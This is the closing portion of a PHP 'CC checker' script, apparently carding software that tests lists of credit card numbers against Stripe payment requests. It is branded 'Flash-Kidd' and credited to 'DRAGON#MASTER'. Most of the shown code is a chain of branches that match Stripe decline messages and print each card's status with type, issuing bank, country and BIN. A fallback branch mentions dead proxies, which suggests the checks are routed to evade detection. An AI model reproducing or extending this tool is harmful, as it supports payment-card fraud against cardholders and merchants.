    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Parameter Invalid Empty</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2,  "lock_timeout")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Lock Timeout</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2,  "transaction_not_allowed")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Transaction Not Allowed</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2, "three_d_secure_redirect")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: 3D Secure Redirect</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2,  'Card is declined by your bank, please contact them for additional information.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Card Is Declined By Your Bank, Please Contact Them For Additional Information.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2, "missing_payment_information")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Missing Payment Information</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Payment Cannot Be Processed, Missing Credit Card Number</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  } 

# ----------------------------------------------------- [Reprovada,Decline Responses END ] -------------------------------------- #



# ------------------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses ] ---------------------------------- #

elseif 
(strpos($result2,  '-1')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Update Nonce </span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  }

else {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-2REQ</span> | <span class="badge badge-warning">Reason: Dead Proxy/Error Not listed/CC Checker Dead</span> | <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span> | <span class="badge badge-success">⚡️Flash-Kidd⚡️</span></br>';
  }
# --------------------------------- [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] --------------------------------------- #

# ----------------------------------------------------------- [Responses END] --------------------------------------------------- #

curl_close($ch);
ob_flush();

#echo "<b>1REQ Result:</b> $result1<br><br>";
#echo "<b>2REQ Result:</b> $result2<br><br>";

#---------------------------------------------------------------------------------------------------------------------------------#
#---------------------------------------------------[MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]----------------------------------------------------#
#---------------------------------------------------------------------------------------------------------------------------------#

?>